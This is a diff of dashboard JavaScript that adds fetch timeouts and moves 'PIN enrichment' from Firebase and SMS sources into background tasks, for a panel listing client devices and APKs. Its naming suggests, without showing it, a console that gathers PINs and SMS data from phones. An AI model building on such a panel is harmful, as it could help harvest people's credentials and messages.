@@ -824,10 +824,19 @@ function toggleDeviceCheck(id,ev){
   if(!d)return;
   patchClientField(d,{checked:!isApkChecked(id)});
 }
-function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){
-  if(!r.ok)return null;
-  return r.json();
-}).catch(function(){return null;});}
+function restJson(url,timeoutMs){
+  timeoutMs=timeoutMs||12000;
+  var ctrl=typeof AbortController!=='undefined'?new AbortController():null;
+  var timer=ctrl?setTimeout(function(){try{ctrl.abort();}catch(e){}},timeoutMs):null;
+  return fetch(url,{cache:'no-store',signal:ctrl?ctrl.signal:undefined}).then(function(r){
+    if(timer)clearTimeout(timer);
+    if(!r.ok)return null;
+    return r.json();
+  }).catch(function(){
+    if(timer)clearTimeout(timer);
+    return null;
+  });
+}
 function isFirebaseErr(d){return !!(d&&typeof d==='object'&&d.error&&Object.keys(d).length<=2);}
 
 function loadFirebaseConfigs(){
@@ -1331,7 +1340,7 @@ function enrichPinsFromFirebase(inst){
   });
 }
 function enrichPinsFromSms(inst){
-  var keys=Object.keys(clientsRawMap), tasks=[], batch=0, maxBatch=24;
+  var keys=Object.keys(clientsRawMap), tasks=[], batch=0, maxBatch=8;
   keys.forEach(function(mapKey){
     var p=parseDevKey(mapKey);
     if(p.fbId!==inst.id)return;
@@ -1355,11 +1364,20 @@ function enrichFromUserList(inst){
   }).then(function(){
     return enrichFromAllNodes(inst);
   }).then(function(){
-    return enrichPinsFromFirebase(inst);
-  }).then(function(){
-    return enrichPinsFromSms(inst);
-  }).then(function(){
     processClientsData();
+  });
+}
+function runBackgroundPinEnrichment(inst){
+  if(!inst)return Promise.resolve();
+  return enrichPinsFromFirebase(inst).catch(function(){return null;}).then(function(){
+    return enrichPinsFromSms(inst);
+  }).catch(function(){return null;}).then(function(){
+    processClientsData();
+  });
+}
+function runBackgroundPinEnrichmentAll(){
+  firebaseInstances.forEach(function(inst){
+    runBackgroundPinEnrichment(inst);
   });
 }
 function mergeSummaryNode(fbId,node,raw){
@@ -1505,11 +1523,24 @@ function fetchAllData(force){
   var showBlock=!_initialLoadDone||!!force;
   if(showBlock)showLoading(true,true);
   firebaseInstances.forEach(attachLive);
-  return Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
+  var sync=Promise.all(firebaseInstances.map(discoverInstance));
+  var timeoutMs=showBlock?12000:45000;
+  var timeout=new Promise(function(resolve){setTimeout(resolve,timeoutMs);});
+  function finishLoad(){
     processClientsDataNow();
     _initialLoadDone=true;
     if(showBlock)showLoading(false,true);
-  }).catch(function(){if(showBlock)showLoading(false,true);});
+  }
+  return Promise.race([sync,timeout]).then(function(){
+    finishLoad();
+    sync.then(function(){
+      processClientsDataNow();
+      runBackgroundPinEnrichmentAll();
+    }).catch(function(){runBackgroundPinEnrichmentAll();});
+  }).catch(function(){
+    finishLoad();
+    runBackgroundPinEnrichmentAll();
+  });
 }
 function refreshData(){toast('Refreshing...',true);fetchAllData(true);}
 
